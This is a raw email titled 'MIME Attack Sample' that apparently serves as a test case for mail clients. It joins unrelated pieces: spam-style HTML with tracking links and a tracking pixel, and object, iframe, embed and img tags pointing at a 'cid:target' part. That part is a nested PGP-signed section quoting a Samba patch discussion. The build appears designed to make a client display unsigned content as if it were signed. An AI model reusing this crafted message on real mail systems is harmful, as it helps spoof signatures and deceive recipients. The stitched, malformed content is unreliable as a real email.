From: joe@fpud.com
To: clarissa.garcia@enron.com, robert.allwein@enron.com, tracy.wood@enron.com, 
Subject: MIME Attack Sample
Content-Type: multipart/related; boundary="DELIMITER"
--DELIMITER
Content-Type: text/html
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html>
<head>
<title>standard</title>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
1">
</head>
<body bgcolor=3D"#FFFFFF"><p align=3D"center"><font face=3D"Arial" size=3D"=
2">If
      you cannot adequately view this message, please follow this link: <a =
href=3Dhttp://ntg67.com/track/rd.php/156671/4405/0629-h1-ientrt/2374>Pionee=
rInDashNavigation</a></font></p>=20
<!-- ImageReady Slices (indash_standard.psd) -->
<div align=3D"center">
  <table id=3D"Table_01" width=3D"498" border=3D"0" cellpadding=3D"0" cells=
pacing=3D"0">
	  <tr>
		  <td colspan=3D"4">
			  <a href=3D"http://kcbwhtumkh.globalretailonline.com/t/l?g4-=
18bv-1-wdu-8jdp"><img src=3D"http://day.redoubt500.com/img/indash_stand=
ard/images/indash_standard_01.jpg" alt=3D"" width=3D"497" height=3D"95" bor=
der=3D"0"></a></td>
		  <td>
			  <img src=3D"http://day.redoubt500.com/img/indash_standard/images/space=
r.gif" width=3D"1" height=3D"95" alt=3D""></td>
	  </tr>
	  <tr>
		  <td rowspan=3D"4">
			  <a href=3D"http://kcbwhtumkh.globalretailonline.com/t/l?g4-=
18bv-2-wdu-8jdp"><img src=3D"http://day.redoubt500.com/img/indash_stand=
ard/images/indash_standard_02.jpg" alt=3D"" width=3D"111" height=3D"330" bo=
rder=3D"0"></a></td>
		  <td rowspan=3D"3">
			  <a href=3D"http://kcbwhtumkh.globalretailonline.com/t/l?g4-=
18bv-3-wdu-8jdp"><img src=3D"http://day.redoubt500.com/img/indash_stand=
ard/images/indash_standard_03.gif" alt=3D"" width=3D"263" height=3D"138" bo=
rder=3D"0"></a></td>
		  <td colspan=3D"2">
			  <a href=3D"http://kcbwhtumkh.globalretailonline.com/t/l?g4-=
18bv-4-wdu-8jdp"><img src=3D"http://day.redoubt500.com/img/indash_stand=
ard/images/indash_standard_04.jpg" alt=3D"" width=3D"123" height=3D"95" bor=
der=3D"0"></a></td>
		  <td>
			  <img src=3D"http://day.redoubt500.com/img/indash_standard/images/space=
r.gif" width=3D"1" height=3D"95" alt=3D""></td>
	  </tr>
	  <tr>
		  <td>
			  <a href=3D"http://kcbwhtumkh.globalretailonline.com/t/l?g4-=
18bv-5-wdu-8jdp"><img src=3D"http://day.redoubt500.com/img/indash_stand=
ard/images/indash_standard_05.jpg" alt=3D"" width=3D"82" height=3D"33" bord=
er=3D"0"></a></td>
		  <td>
			  <a href=3D"http://kcbwhtumkh.globalretailonline.com/t/l?g4-=
18bv-6-wdu-8jdp"><img src=3D"http://day.redoubt500.com/img/indash_stand=
ard/images/indash_standard_06.gif" alt=3D"" width=3D"41" height=3D"33" bord=
er=3D"0"></a></td>
		  <td>
			  <img src=3D"http://day.redoubt500.com/img/indash_standard/images/space=
r.gif" width=3D"1" height=3D"33" alt=3D""></td>
	  </tr>
	  <tr>
		  <td colspan=3D"2" rowspan=3D"2">
			  <a href=3D"http://kcbwhtumkh.globalretailonline.com/t/l?g4-=
18bv-7-wdu-8jdp"><img src=3D"http://day.redoubt500.com/img/indash_stand=
ard/images/indash_standard_07.jpg" alt=3D"" width=3D"123" height=3D"202" bo=
rder=3D"0"></a></td>
		  <td>
			  <img src=3D"http://day.redoubt500.com/img/indash_standard/images/space=
r.gif" width=3D"1" height=3D"10" alt=3D""></td>
	  </tr>
	  <tr>
		  <td>
			  <a href=3D"http://kcbwhtumkh.globalretailonline.com/t/l?g4-=
18bv-8-wdu-8jdp"><img src=3D"http://day.redoubt500.com/img/indash_stand=
ard/images/indash_standard_08.jpg" alt=3D"" width=3D"263" height=3D"192" bo=
rder=3D"0"></a></td>
		  <td>
			  <img src=3D"http://day.redoubt500.com/img/indash_standard/images/space=
r.gif" width=3D"1" height=3D"192" alt=3D""></td>
	  </tr>
  </table>
  <!-- End ImageReady Slices -->
  <p><a href=3Dhttp://cernedblance.com/mcve/unsub.html><img src=3D"http://d=
ay.redoubt500.com/img/indash_standard/images/indash_disclaimerNew.gif" widt=
h=3D"636" height=3D"159" border=3D"0"></a></p>
</div>
<div align=3D"center"><font face=3D"verdana" color=3D"#525252" size=3D"2">Y=
ou registered to receive this and similar offers from  on =
.</font></div><font size=3D1 face=3Dverdana>If you no longer wish to receiv=
e these commercial emails, you may remove yourself from our mailing list by=
 emailing us at <a href=3D<A HREF=3D"mailto:r.Montague.26-93dede6-6d8b.speedy.uwaterloo.ca.-producttestpanel=
@kcbwhtumkh.globalretailonline.com?subject=3Dremove">r.Montague.=
26-93dede6-6d8b.speedy.uwaterloo.ca.-producttestpanel@kcbwhtumkh.globalretailonline.com=
</A> > or <A HREF=3D"http://kcbwhtumkh.globalretailonline.com/de=
lete?l=3DMontague.26-93dede6-6d8b&e=3Dproducttestpanel%40speedy.uwaterloo.ca"> click here</A> or by ca=
lling our unsubscribe hotline at 800-507-1653.<br> Please note this phone n=
umber is used solely for unsubscribe requests. Please allow up to five busi=
ness days for your request to be processed.<br>

You may also contact us by writing to us at our postal address: <br>Montagu=
e| 9600 Great Hills Trail, Suite 150 W| Austin, TX 78759 <br></font></body>=
</html>


<BR CLEAR=3D"ALL">
<IMG SRC=3D"http://kcbwhtumkh.globalretailonline.com/t/r?g4-18bv=
-0-8jdp" WIDTH=3D33 HEIGHT=3D12 BORDER=3D0 ALIGN=3D"RIGHT" ALT=3D"">

</BODY></HTML>

<object width="100%" height="25" data="cid:target"></object>
<iframe width="100%" height="25"  src="cid:target"></iframe>
<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
--DELIMITER
Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
--BOUNDARY
Content-Type: text/plain
Content-Transfer-Encoding: quoted-printable
h: SHA1
>=20
> >  /*
> > @@ -602,6 +609,39 @@
> >  static NTSTATUS ipc_qfileinfo(struct ntvfs_module_context *ntvfs,
> >  			      struct ntvfs_request *req, union smb_fileinfo *info)
> >  {
> > +	struct ipc_private *private =3D ntvfs->private_data;
> > +	switch (info->generic.level) {
> > +	case RAW_FILEINFO_GENERIC:=20
> > +	{
> > +		struct pipe_state *p;
> > +		p =3D pipe_state_find(private, info->generic.in.file.ntvfs);
> > +		if (!p) {
> > +			return NT_STATUS_INVALID_HANDLE;
> > +		}
> > +		ZERO_STRUCT(info->generic.out);
> > +		info->generic.out.attrib =3D FILE_ATTRIBUTE_NORMAL;
> > +		info->generic.out.fname.s =3D strrchr(p->pipe_name, '\\');
> > +		info->generic.out.alloc_size =3D 4096;
> > +		info->generic.out.nlink =3D 1;
> > +		/* What the heck?  Match Win2k3: IPC$ pipes are delete pending */
> > +		info->generic.out.delete_pending =3D 1;
> > +		return NT_STATUS_OK;
> > +	}
> > +	case RAW_FILEINFO_ALT_NAME_INFO:
> > +	case RAW_FILEINFO_ALT_NAME_INFORMATION:
> > +	case RAW_FILEINFO_STREAM_INFO:
> > +	case RAW_FILEINFO_STREAM_INFORMATION:
> > +	case RAW_FILEINFO_COMPRESSION_INFO:
> > +	case RAW_FILEINFO_COMPRESSION_INFORMATION:
> > +	case RAW_FILEINFO_NETWORK_OPEN_INFORMATION:
> > +	case RAW_FILEINFO_ATTRIBUTE_TAG_INFORMATION:
> > +		return NT_STATUS_INVALID_PARAMETER;
> > +	case  RAW_FILEINFO_ALL_EAS:
> > +		return NT_STATUS_ACCESS_DENIED;
> > +	default:
> > +		return ntvfs_map_qfileinfo(ntvfs, req, info);
> > +	}
> > +=09
>=20
> Hi Andrew,
>=20
> are you sure that the other levels always give INVALID_PARAMETER and
> not INVALID_HANDLE even if the handle isn't valid?

I didn't explore that, but that seems reasonable.  Any suggestions on a
reliably un-used fnum?  (0xffff)?

Andrew Bartlett

--=20
Andrew Bartlett                                http://samba.org/~abartlet/
Authentication Developer, Samba Team           http://samba.org
Samba Developer, Red Hat Inc.                  http://redhat.com

--=-ogYfZhHk3pqCx2Ze1QTS
Content-Type: application/pgp-signature; name=signature.asc
Content-Description: This is a digitally signed message part

-BOUNDARY--
Content-Type: application/pgp-signature; name="signature.asc"
BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (GNU/Linux)

iD8DBQBGSVk0z4A8Wyi0NrsRAgyeAJ9ICwOmATZt0rXRZJXV7+EUB/jppgCfel5R
K8IsMLiLXAuY5C/jfWYfe44=
=48dY
-----END PGP SIGNATURE-----

--=-
--BOUNDARY--
--DELIMITER--
